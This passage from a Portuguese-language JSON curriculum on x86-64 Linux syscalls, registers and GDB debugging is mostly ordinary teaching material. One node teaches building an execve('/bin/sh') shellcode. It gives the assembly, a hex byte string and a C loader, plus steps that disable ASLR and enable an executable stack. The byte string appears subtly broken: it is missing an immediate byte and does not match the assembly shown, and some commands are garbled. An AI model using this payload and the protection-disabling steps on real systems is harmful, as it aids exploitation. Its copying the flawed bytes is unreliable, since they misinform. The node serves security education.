                                "Programação em Assembly: Convenções de ABI Linux x86_64"
                              ],
                              "realWorldApplication": "Em análise de malware e reverse engineering, identificar SYSCALL permite mapear comportamentos como leitura de arquivos (open/read), rede (socket/connect) ou persistência, essencial para detecção de ameaças em binários obfuscados ou rootkits."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.2.2",
                            "name": "Configurar registradores para syscalls em 64 bits",
                            "description": "Definir RAX com o número da syscall (ex: 60 para exit), RDI com o parâmetro de status, e outros registradores conforme ABI System V AMD64, executando SYSCALL para funções como read ou open.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a convenção ABI System V AMD64 para syscalls",
                                  "subSteps": [
                                    "Ler a documentação oficial da ABI System V AMD64 sobre chamadas de sistema.",
                                    "Identificar os registradores principais: RAX (número da syscall), RDI (1º arg), RSI (2º arg), RDX (3º arg), R10 (4º arg), R8 (5º arg), R9 (6º arg).",
                                    "Entender que RCX e R11 são sobrescritos pela instrução SYSCALL.",
                                    "Comparar com convenções de função normal (onde args vão em RDI, RSI, etc., mas syscall usa RAX para número).",
                                    "Anotar diferenças com x86 32-bits (int 0x80)."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito os 6 primeiros registradores de argumento e seu uso em syscalls.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Documentação ABI System V AMD64 (PDF ou online)",
                                    "Referência de syscalls Linux (man syscall ou kernel.org)",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": [
                                    "Use diagramas para visualizar o fluxo de registradores.",
                                    "Foquem em exemplos de 64-bits; ignore 32-bits inicialmente."
                                  ],
                                  "learningObjective": "Dominar a convenção de registradores para passagem de argumentos em syscalls x86-64.",
                                  "commonMistakes": [
                                    "Confundir ordem de args com calling convention de funções C.",
                                    "Esquecer que SYSCALL clobbers RCX e R11."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar números de syscalls comuns em Linux x86-64",
                                  "subSteps": [
                                    "Consultar tabela de syscalls (ex: exit=60, read=0, write=1, open=2, close=3).",
                                    "Criar uma tabela com 10 syscalls mais usadas e seus números.",
                                    "Associar cada syscall aos argumentos necessários (ex: exit usa 1 arg em RDI).",
                                    "Testar memória recitando 5 syscalls sem consultar tabela.",
                                    "Verificar em documentação oficial para confirmar."
                                  ],
                                  "verification": "Listar corretamente números e args de 5 syscalls comuns sem erros.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Tabela de syscalls x86-64 (syscall.h ou online)",
                                    "Papel e caneta para tabela personalizada"
                                  ],
                                  "tips": [
                                    "Use mnemônicos: 'write=1' como primeiro após read=0.",
                                    "Priorize syscalls de arquivo e processo."
                                  ],
                                  "learningObjective": "Recordar números de syscalls essenciais para configuração rápida de RAX.",
                                  "commonMistakes": [
                                    "Usar números de x86 32-bits (ex: exit=1 em vez de 60).",
                                    "Confundir read(0) com write(1)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar registradores para syscall simples (exit)",
                                  "subSteps": [
                                    "Escrever código assembly: mov rax, 60; mov rdi, 42; syscall.",
                                    "Explicar cada instrução: MOV para carregar valores.",
                                    "Compilar com NASM: nasm -f elf64 arquivo.asm; ld arquivo.o -o exec.",
                                    "Executar e observar saída (status 42 via echo $? ).",
                                    "Modificar status e retestar."
                                  ],
                                  "verification": "Programa termina com status correto, verificado com $?.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "ld linker",
                                    "Terminal Linux x86-64",
                                    "Editor como vim ou VSCode"
                                  ],
                                  "tips": [
                                    "Use valores pequenos para status (0-255).",
                                    "Teste em VM para evitar crashes."
                                  ],
                                  "learningObjective": "Configurar RAX e RDI corretamente para syscalls de 1 argumento.",
                                  "commonMistakes": [
                                    "Esquecer de limpar registradores (use XOR ou MOV 0).",
                                    "Usar RSI em vez de RDI para primeiro arg."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar para syscalls com múltiplos argumentos (read)",
                                  "subSteps": [
                                    "Selecionar read (RAX=0): RDI=fd (0 para stdin), RSI=buffer, RDX=tamanho.",
                                    "Alocar buffer: section .bss; buffer resb 1024.",
                                    "Escrever código: mov rax,0; mov rdi,0; mov rsi,buffer; mov rdx,10; syscall.",
                                    "Compilar, executar e verificar buffer com strace ou hexdump.",
                                    "Expandir para write (RAX=1) usando buffer lido."
                                  ],
                                  "verification": "Ler dados corretamente do stdin e processar sem erros.",
                                  "estimatedTime": "30-40 minutos",
                                  "materials": [
                                    "NASM, ld",
                                    "strace para depuração",
                                    "Hexdump ou xxd"
                                  ],
                                  "tips": [
                                    "Sempre inicialize buffer para evitar lixo.",
                                    "Use strace -e trace=read para confirmar args."
                                  ],
                                  "learningObjective": "Gerenciar múltiplos registradores (RDI, RSI, RDX) para syscalls complexas.",
                                  "commonMistakes": [
                                    "Passar ponteiro incorreto para RSI.",
                                    "Tamanho excessivo em RDX causando buffer overflow."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Depurar e validar configurações com ferramentas",
                                  "subSteps": [
                                    "Usar GDB: gdb ./exec; break *main; run; info registers rax rdi etc.",
                                    "Verificar valores pré-SYSCALL com x/i $pc.",
                                    "Testar erros comuns: args inválidos (ex: fd=-1 em read).",
                                    "Criar script para 3 syscalls diferentes e validar todas.",
                                    "Documentar observações em relatório curto."
                                  ],
                                  "verification": "GDB mostra registradores corretos antes de SYSCALL em múltiplos testes.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Programa compilado dos steps anteriores"
                                  ],
                                  "tips": [
                                    "Comando 'ni' para next instruction em GDB.",
                                    "Monitore RAX pós-syscall para código de retorno."
                                  ],
                                  "learningObjective": "Validar e depurar configurações de registradores em ambiente real.",
                                  "commonMistakes": [
                                    "Não pausar antes de SYSCALL no debugger.",
                                    "Ignorar códigos de erro em RAX."
                                  ]
                                }
                              ],
                              "practicalExample": "Código Assembly para read e write eco:\nsection .data\nmsg db 'Digite: ',0\nsection .bss\nbuf resb 64\nsection .text\nglobal _start\n_start:\nmov rax,1 ; write\nmov rdi,1 ; stdout\nmov rsi,msg\nmov rdx,7\nsyscall\nmov rax,0 ; read\nmov rdi,0 ; stdin\nmov rsi,buf\nmov rdx,64\nsyscall\nmov rax,1 ; write\nmov rdi,1\nmov rsi,buf\nmov rdx,rax ; tamanho lido\nsyscall\nmov rax,60 ; exit\nmov rdi,0\nsyscall\nCompilar: nasm -f elf64 eco.asm; ld eco.o -o eco; ./eco",
                              "finalVerifications": [
                                "Configurar RAX, RDI, RSI, RDX corretamente para read/write.",
                                "Executar SYSCALL sem crash ou SIGSEGV.",
                                "Verificar retorno em RAX via GDB ou strace.",
                                "Reproduzir exemplo prático com sucesso.",
                                "Explicar ABI para qualquer syscall comum.",
                                "Identificar e corrigir erro em código fornecido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de registradores conforme ABI.",
                                "Correta associação de números de syscall a funções.",
                                "Execução bem-sucedida de programas assembly.",
                                "Uso adequado de debugger para validação.",
                                "Identificação de erros comuns e correções.",
                                "Clareza na explicação oral/escrita da convenção."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender kernel interface.",
                                "Programação em C: Comparar com libc wrappers.",
                                "Segurança Computacional: Análise de shellcodes em exploits.",
                                "Arquitetura de Computadores: Registradores e instruções x86-64.",
                                "Reverse Engineering: Dissecar binários com syscalls."
                              ],
                              "realWorldApplication": "Em segurança computacional, configurar registradores corretamente permite criar shellcodes para testes de exploits, analisar malware que usa syscalls diretas para bypass de hooks (ex: anti-debugging), ou em ferramentas de RE como ROP chains em binários x86-64."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.2.3",
                            "name": "Compilar e depurar syscall write em assembly 64 bits",
                            "description": "Criar código assembly usando SYSCALL para write(1, \"Hello\", 5), compilar com NASM (nasm -f elf64), linkar com ld, e depurar com gdb para observar o fluxo de execução e retorno em RAX.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e escrever o código assembly para syscall write",
                                  "subSteps": [
                                    "Instale ou verifique a presença de NASM, ld e gdb no sistema Linux x86_64 (ex: sudo apt install nasm build-essential gdb).",
                                    "Crie um novo arquivo chamado hello.asm usando um editor de texto como vim ou nano.",
                                    "Defina a seção .data com a mensagem: msg db 'Hello', 10 e len equ $ - msg.",
                                    "Defina a seção .text com global _start, mov rax,1; mov rdi,1; mov rsi,msg; mov rdx,len; syscall.",
                                    "Adicione sys_exit: mov rax,60; mov rdi,0; syscall.",
                                    "Salve o arquivo."
                                  ],
                                  "verification": "O arquivo hello.asm existe, abre sem erros de sintaxe e contém as seções corretas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (vim, nano)",
                                    "Terminal Linux x86_64",
                                    "NASM, ld e gdb instalados"
                                  ],
                                  "tips": "Use equ para calcular o comprimento da string automaticamente e inclua newline (10) para quebra de linha.",
                                  "learningObjective": "Compreender a estrutura mínima de um programa assembly x86_64 que usa syscalls diretamente, sem bibliotecas.",
                                  "commonMistakes": "Esquecer de declarar global _start, usar registradores errados (RAX deve ser 1 para write), ou calcular length manualmente em vez de $ - msg."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar o código assembly em um arquivo objeto ELF64",
                                  "subSteps": [
                                    "Abra o terminal e navegue para o diretório contendo hello.asm.",
                                    "Execute o comando: nasm -f elf64 hello.asm -o hello.o",
                                    "Verifique erros de compilação com o output do NASM.",
                                    "Confirme a criação do arquivo com ls -la hello.o e verifique tamanho > 0.",
                                    "Use objdump -d hello.o para inspecionar o código objeto gerado."
                                  ],
                                  "verification": "Arquivo hello.o é criado sem erros e objdump mostra as instruções mov e syscall corretas.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Terminal",
                                    "NASM instalado"
                                  ],
                                  "tips": "O flag -f elf64 é essencial para x86_64; use -g para debug symbols se necessário.",
                                  "learningObjective": "Dominar a compilação de assembly em formato objeto ELF64 compatível com linker.",
                                  "commonMistakes": "Usar formato errado como elf32 em vez de elf64, causando erros de linkagem posterior."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Linkar o arquivo objeto em um executável standalone",
                                  "subSteps": [
                                    "No terminal, execute: ld hello.o -o hello",
                                    "Verifique erros de linkagem no output do ld.",
                                    "Torne o executável rodável: chmod +x hello",
                                    "Teste execução: ./hello e confirme saída 'Hello\n'",
                                    "Use file hello para confirmar tipo ELF 64-bit executable."
                                  ],
                                  "verification": "Executável hello roda sem erros, imprime 'Hello' seguido de newline, e file confirma ELF64.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Terminal",
                                    "ld instalado"
                                  ],
                                  "tips": "ld por padrão cria executável minimalista sem dependências de libc, ideal para syscalls puras.",
                                  "learningObjective": "Entender o processo de linkagem estática para binários independentes em assembly.",
                                  "commonMistakes": "Esquecer chmod +x, causando 'Permission denied', ou erros de link se formato objeto incompatível."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Depurar o executável com GDB para observar o fluxo de syscall",
                                  "subSteps": [
                                    "Inicie GDB: gdb ./hello",
                                    "Defina breakpoint: break _start",
                                    "Execute: run",
                                    "Inspecione registradores: info registers (verifique RAX=1, RDI=1, RSI=endereço de msg, RDX=6)",
                                    "Avance instrução por instrução: stepi até syscall",
                                    "Após syscall: info registers (RAX deve retornar 6, bytes escritos)",
                                    "Continue: continue e observe saída e exit.",
                                    "Saia do GDB: quit"
                                  ],
                                  "verification": "GDB mostra registradores corretos pré e pós-syscall, RAX retorna número de bytes escritos, e programa termina normalmente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal",
                                    "GDB instalado"
                                  ],
                                  "tips": "Use x/s $rsi para examinar a string em memória durante debug.",
                                  "learningObjective": "Analisar o fluxo de execução de syscalls em registradores e memória usando debugger.",
                                  "commonMistakes": "Breakpoint em local errado (use _start), ou não notar que syscall cloba RCX/R11 em x86_64."
                                }
                              ],
                              "practicalExample": "Escreva hello.asm com msg 'Hello\n' (len=6), compile nasm -f elf64 hello.asm -o hello.o, link ld hello.o -o hello, execute ./hello (imprime Hello), depure gdb ./hello: break _start, run, info reg (pré-syscall: rax=0x1 rdi=0x1 rsi=0x4000xx rdx=0x6), stepi ao syscall, pós: rax=0x6, continue.",
                              "finalVerifications": [
                                "Código assembly compila e linka sem erros.",
                                "Executável imprime exatamente 'Hello' seguido de newline.",
                                "No GDB, pré-syscall: RAX=1 (sys_write), RDI=1 (stdout), RSI=endereço msg, RDX=6 (len).",
                                "Pós-syscall: RAX=6 (bytes escritos).",
                                "Programa sai via sys_exit (RAX=60, RDI=0) sem crash.",
                                "Objdump ou readelf confirma ELF64 sem dependências externas."
                              ],
                              "assessmentCriteria": [
                                "Código assembly usa syscalls corretas sem chamadas de libc.",
                                "Comandos NASM e LD executados precisamente com flags corretos.",
                                "Depuração no GDB demonstra inspeção precisa de registradores e memória.",
                                "Entendimento verbal do papel de cada registrador em sys_write.",
                                "Identificação de erros comuns como length incorreto ou registradores trocados.",
                                "Binário final é minimalista (<1KB) e roda em qualquer Linux x86_64."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Interface kernel-user via syscalls e modelo de registradores x86_64.",
                                "Arquitetura de Computadores: Instruções MOV, SYSCALL e convenções de chamada AMD64.",
                                "Segurança Computacional: Análise de shellcodes e binários que evitam libc para stealth.",
                                "Engenharia de Software: Desenvolvimento e debug de software de baixo nível.",
                                "Análise de Binários: Uso de ferramentas como objdump, readelf e GDB em RE."
                              ],
                              "realWorldApplication": "Em segurança cibernética, engenheiros reversos usam essa técnica para analisar malwares que empregam syscalls diretas para escrever arquivos ou sockets sem detecção por monitors de API libc, facilitando análise de exploits e shellcodes em incident response."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.1.1.3",
                        "name": "Diferenças e Convenções de Parâmetros em Syscalls x86",
                        "description": "Comparação entre INT 0x80 e SYSCALL, incluindo convenções de passagem de argumentos, tabelas de números de syscalls (/usr/include/asm/unistd.h) e impactos em shellcodes para exploração.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.1.3.1",
                            "name": "Comparar convenções de registradores 32 vs 64 bits",
                            "description": "Analisar tabelas de syscalls Linux para i386 e x86_64, mapeando EAX/EBX para RAX/RDI, e identificar incompatibilidades em binários híbridos ou shellcodes portáteis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar Convenções de Syscalls em Arquitetura i386 (32 bits)",
                                  "subSteps": [
                                    "Consulte tabelas de syscalls Linux para i386 (ex: syscalls 1-read, 4-write).",
                                    "Identifique registradores principais: EAX para número da syscall, EBX/ECX/EDX para parâmetros 1-3.",
                                    "Analise exemplos de assembly i386 usando int 0x80 como invocação.",
                                    "Compile e execute um programa simples em 32 bits para observar chamadas.",
                                    "Anote convenções de passagem de parâmetros e limites (até 6 params via stack)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como EAX e EBX são usados em uma syscall read(3).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Tabela de syscalls i386 (kernel.org)",
                                    "GCC com multilib para i386",
                                    "GDB para depuração",
                                    "Exemplos de assembly i386"
                                  ],
                                  "tips": "Use 'man 2 syscall' e filtre por i386; teste em VM 32 bits para evitar issues de compatibilidade.",
                                  "learningObjective": "Compreender o protocolo de syscalls em 32 bits, focando em registradores EAX/EBX/ECX/EDX.",
                                  "commonMistakes": [
                                    "Confundir int 0x80 com syscall moderna",
                                    "Ignorar alinhamento de stack para params extras",
                                    "Não verificar errno após falha"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Convenções de Syscalls em Arquitetura x86_64 (64 bits)",
                                  "subSteps": [
                                    "Consulte tabelas de syscalls para x86_64 (ex: syscalls 0-read, 1-write; números mudam).",
                                    "Identifique registradores: RAX para número da syscall, RDI/RSI/RDX/R10/R8/R9 para parâmetros 1-6.",
                                    "Analise uso de 'syscall' instruction em vez de int 0x80.",
                                    "Compile e execute um programa 64 bits para depurar chamadas.",
                                    "Note mudanças: sem stack para primeiros params, RCX salvado automaticamente."
                                  ],
                                  "verification": "Descreva o mapeamento de parâmetros para uma syscall write(1) em x86_64.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Tabela de syscalls x86_64 (kernel.org)",
                                    "GCC nativo 64 bits",
                                    "GDB para x86_64",
                                    "Exemplos de assembly x86_64"
                                  ],
                                  "tips": "Use 'as --64' para assemble; depure com 'info registers' no GDB para ver RAX/RDI.",
                                  "learningObjective": "Dominar protocolo de syscalls em 64 bits, enfatizando RAX/RDI e instrução syscall.",
                                  "commonMistakes": [
                                    "Usar números de syscall i386 em 64 bits",
                                    "Esquecer de preservar RCX/R11",
                                    "Passar pointers 32-bit em registradores 64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar e Mapear Diferenças de Registradores",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: EAX→RAX, EBX→RDI, ECX→RSI, EDX→RDX.",
                                    "Mapeie syscalls comuns (ex: exit: 1→60; read: 3→0).",
                                    "Discuta impactos: tamanho de registradores (32→64 bits), ordem de params ligeiramente alterada.",
                                    "Teste migração: reescreva um shellcode i386 para x86_64.",
                                    "Identifique convenções compartilhadas (ex: retorno em RAX/EAX)."
                                  ],
                                  "verification": "Apresente tabela de mapeamento com 5 syscalls e explique 3 diferenças chave.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha ou Markdown para tabela",
                                    "NASM/YASM para assembly cross",
                                    "Documentação kernel syscall tables"
                                  ],
                                  "tips": "Use diff visual entre tabelas; foque em ABI System V para x86_64.",
                                  "learningObjective": "Mapear precisamente registradores e números de syscalls entre arquiteturas.",
                                  "commonMistakes": [
                                    "Mapear incorretamente EBX→RDI (sim, mas confirme ordem)",
                                    "Ignorar mudança em números de syscall",
                                    "Não considerar zero-extension em migração"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Incompatibilidades em Binários Híbridos e Shellcodes",
                                  "subSteps": [
                                    "Analise binário híbrido com 'file' e 'readelf -h' para detectar arch.",
                                    "Teste shellcode i386 em ambiente 64 bits (falha em int 0x80).",
                                    "Crie shellcode portátil ou detecte issues (ex: params errados causam segfault).",
                                    "Use strace para comparar traces de execução 32 vs 64 bits.",
                                    "Desenvolva detector simples de arch em shellcode via padrões de registradores."
                                  ],
                                  "verification": "Demonstre falha de um shellcode i386 em x86_64 e corrija para funcionar.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "strace",
                                    "readelf/objdump",
                                    "Ambiente dual-arch (Docker/multiarch)",
                                    "Exemplos de shellcodes (exploit-db)"
                                  ],
                                  "tips": "Use qemu-user para emular 32 bits em host 64; evite root para testes.",
                                  "learningObjective": "Detectar e mitigar incompatibilidades em cenários reais de análise binária.",
                                  "commonMistakes": [
                                    "Executar 32-bit nativo em 64-bit sem compat layer",
                                    "Não checar ASLR/compat mode",
                                    "Subestimar impacto de syscall numbers"
                                  ]
                                }
                              ],
                              "practicalExample": "Escreva um shellcode para 'execve(/bin/sh)' em i386 usando int 0x80 (EBX=filename, ECX=argv, EDX=envp). Migre para x86_64 com syscall, RDI=filename, RSI=argv, RDX=envp, RAX=59. Teste ambos com loader customizado e observe falhas cross-arch via GDB/strace.",
                              "finalVerifications": [
                                "Lista corretamente mapeamento de 5 registradores chave (EAX→RAX, etc.).",
                                "Explica mudança em 3 números de syscalls comuns (read 3→0).",
                                "Identifica por que int 0x80 falha em x86_64.",
                                "Cria tabela comparativa precisa.",
                                "Depura e corrige shellcode híbrido sem erros.",
                                "Discute impactos em binários position-independent."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de registradores e syscalls (90% correto).",
                                "Profundidade na análise de incompatibilidades (exemplos concretos).",
                                "Habilidade em depuração prática com GDB/strace.",
                                "Clareza na tabela comparativa e explicações.",
                                "Criatividade em exemplos de shellcodes portáteis.",
                                "Compreensão de ABIs (System V i386 vs x86_64)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores e instruções de mudança de modo.",
                                "Programação em Assembly: Escrita e depuração cross-platform.",
                                "Segurança da Informação: Reverse engineering e análise de malwares multi-arch.",
                                "Sistemas Operacionais: ABIs e interfaces kernel-user.",
                                "Engenharia de Software: Portabilidade de código binário."
                              ],
                              "realWorldApplication": "Em análise forense de malwares ou desenvolvimento de exploits, detectar se um shellcode é 32 ou 64 bits evita falhas em pentests; útil em CTFs, RE competições e hardening de sistemas híbridos (ex: WoW64 no Windows)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.3.2",
                            "name": "Consultar números de syscalls e criar shellcode básico",
                            "description": "Usar unistd.h para obter números de syscalls como execve (11 em 32 bits, 59 em 64 bits), e escrever um shellcode simples que spawna /bin/sh via syscall, testando em ambiente controlado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Consultar e documentar números de syscalls para execve",
                                  "subSteps": [
                                    "Inclua o cabeçalho unistd.h em um arquivo C simples e use gcc -E para expandir os defines.",
                                    "Localize SYS_execve em /usr/include/asm/unistd_64.h (para x86-64) e /usr/include/asm/unistd_32.h (para x86-32).",
                                    "Consulte man 2 execve e man 2 syscall para confirmar números: 11 (32-bit), 59 (64-bit).",
                                    "Crie uma tabela comparativa anotando as diferenças entre arquiteturas.",
                                    "Verifique em documentação online como kernel.org para syscalls Linux."
                                  ],
                                  "verification": "Lista documentada com números corretos: SYS_execve = 11 (x86-32), 59 (x86-64).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "unistd.h",
                                    "gcc",
                                    "man pages",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use find /usr/include -name '*unistd*' para localizar arquivos corretos; priorize x86-64 para testes modernos.",
                                  "learningObjective": "Identificar e documentar números de syscalls precisos para execve em x86 32/64 bits.",
                                  "commonMistakes": [
                                    "Confundir números de syscalls entre 32-bit e 64-bit",
                                    "Ignorar headers arquitetura-específicos",
                                    "Usar valores de user-space sem verificar kernel version"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar convenções de parâmetros para syscalls em x86-64",
                                  "subSteps": [
                                    "Revise a ABI do System V para x86-64: RDI (1º arg), RSI (2º), RDX (3º), RAX = syscall number.",
                                    "Para execve: RDI = pathname, RSI = argv (NULL), RDX = envp (NULL).",
                                    "Anote que string deve terminar em NULL e estar alinhada.",
                                    "Compare brevemente com x86-32 (EBX, ECX, EDX, EAX=11).",
                                    "Escreva pseudocódigo para execve('/bin/sh', NULL, NULL)."
                                  ],
                                  "verification": "Pseudocódigo ou diagrama mostrando registradores corretos para x86-64 execve.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação ABI System V",
                                    "Notas ou diagrama"
                                  ],
                                  "tips": "Memorize ordem: RAX=syscall#, RDI/RSI/RDX=arg1/2/3; limpe registradores com XOR.",
                                  "learningObjective": "Compreender e aplicar convenções de passagem de parâmetros em syscalls x86-64.",
                                  "commonMistakes": [
                                    "Usar convenção C calling ao invés de syscall",
                                    "Esquecer de zerar RSI/RDX para NULL",
                                    "Não alinhar strings em memória"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escrever código assembly para shellcode execve(/bin/sh)",
                                  "subSteps": [
                                    "Escreva em NASM: xor rdx, rdx; xor rsi, rsi; mov rdi, 0x68732f2f6e69622f; push rdi; mov rdi, rsp; mov al, 59; syscall.",
                                    "Adicione push 0 após string para NULL terminator se necessário.",
                                    "Salve como execve_shellcode.asm.",
                                    "Compile com nasm -f elf64 e ld para testar sintaxe.",
                                    "Ajuste para null-free se possível (este exemplo é null-free)."
                                  ],
                                  "verification": "Assembly compila sem erros e disassembla corretamente com objdump.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM",
                                    "ld",
                                    "objdump"
                                  ],
                                  "tips": "Use push rdi em vez de mov para stack alignment; teste com 'ndisasm' em bytes.",
                                  "learningObjective": "Criar shellcode assembly funcional para spawnar shell via execve.",
                                  "commonMistakes": [
                                    "Incluir NULL bytes desnecessários",
                                    "Errar endianness na string '/bin/sh'",
                                    "Usar syscall number errado (ex: 59 vs 11)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerar bytes do shellcode e testar em ambiente controlado",
                                  "subSteps": [
                                    "Gere raw bytes: nasm -f bin shellcode.asm -o shellcode.bin; xxdi dump -b.",
                                    "Escreva C loader: char sc[] = \"\\x48\\x31\\xd2...\"; int (*f)() = sc; f();",
                                    "Compile loader com gcc -z execstack -fno-stack-check -no-pie loader.c.",
                                    "Execute com ASLR off: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space.",
                                    "Teste em GDB: gdb ./loader; run; observe /bin/sh spawn."
                                  ],
                                  "verification": "Shellcode executa e spawna /bin/sh interativo sem crash.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM",
                                    "gcc",
                                    "GDB",
                                    "xxd ou hexdump"
                                  ],
                                  "tips": "Use -z execstack para permitir execução na stack; monitore com strace para syscalls.",
                                  "learningObjective": "Extrair e validar shellcode em ambiente isolado.",
                                  "commonMistakes": [
                                    "ASLR on causando falha",
                                    "Stack não executável",
                                    "Offsets errados no loader C"
                                  ]
                                }
                              ],
                              "practicalExample": "Shellcode x86-64 null-free para execve('/bin/sh', NULL, NULL): \\x48\\x31\\xd2\\x52\\x48\\x31\\xf6\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05. Loader C: int main(){void(*s)()=(void*)\"\\x48\\x31\\xd2...\";s();}",
                              "finalVerifications": [
                                "Shellcode spawna /bin/sh interativo ao executar loader.",
                                "Syscall number correto usado (59 para x86-64).",
                                "Nenhum NULL byte no shellcode.",
                                "Disassembly mostra registradores zerados e string '/bin/sh' correta.",
                                "Executa sem segfault em GDB com breakpoints em syscall.",
                                "Strace confirma apenas uma syscall execve bem-sucedida."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos números de syscalls (11/59).",
                                "Convenções de parâmetros corretas (RDI/RSI/RDX).",
                                "Shellcode compacto e null-free.",
                                "Teste bem-sucedido em ambiente controlado.",
                                "Documentação completa de steps e verificações.",
                                "Identificação de erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly (linguagem baixa-nível).",
                                "Sistemas Operacionais (syscalls e kernel interface).",
                                "Programação em C (loaders e headers).",
                                "Segurança da Informação (exploits educacionais).",
                                "Engenharia Reversa (disassembly com objdump)."
                              ],
                              "realWorldApplication": "Em pentesting e CTFs para criar payloads básicos em exploits de buffer overflow; análise de malware que usa syscalls diretas para evasão de detecção; desenvolvimento de ferramentas de segurança como ROP chains em pwn challenges."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.2",
                    "name": "Registradores para Acesso à Memória",
                    "description": "Uso de registradores como RSP, RBP, RAX em operações de pilha e heap em Assembly.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.2.1",
                        "name": "Registrador RSP (Stack Pointer)",
                        "description": "O registrador RSP é o ponteiro da pilha em arquitetura x86-64, apontando para o topo da stack. É fundamental em operações de empilhamento (push/pop) e gerenciamento de chamadas de função, sendo manipulado diretamente em assembly para controle de fluxo e exploits como buffer overflow.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.1.1",
                            "name": "Identificar o papel do RSP em operações de pilha",
                            "description": "Compreender como o RSP indica o topo da stack e é decrementado/incrementado em PUSH/POP, analisando dumps de memória ou código assembly para rastrear alocações na stack em binários ELF/PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do Registrador RSP como Stack Pointer",
                                  "subSteps": [
                                    "Estude a arquitetura x86-64 e o papel da stack na memória.",
                                    "Identifique RSP como o registrador que aponta para o topo da stack.",
                                    "Revise convenções de calling em ELF/PE, como alinhamento de stack.",
                                    "Compare RSP com RBP (base pointer) para entender diferenças.",
                                    "Anote valores iniciais típicos de RSP em processos Linux/Windows."
                                  ],
                                  "verification": "Resuma em um diagrama simples como RSP indica o topo da stack antes e após inicialização.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals (Vol. 1)",
                                    "Diagrama de stack em papel ou ferramenta como draw.io"
                                  ],
                                  "tips": "Visualize a stack crescendo para baixo na memória (endereços decrescentes).",
                                  "learningObjective": "Explicar o papel fundamental do RSP na gestão da stack em binários x86-64.",
                                  "commonMistakes": "Confundir RSP com RBP ou assumir stack crescendo para cima."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Operações PUSH e POP no Contexto do RSP",
                                  "subSteps": [
                                    "Examine instrução PUSH: como decrementa RSP em 8 bytes e armazena valor.",
                                    "Examine instrução POP: como incrementa RSP em 8 bytes e recupera valor.",
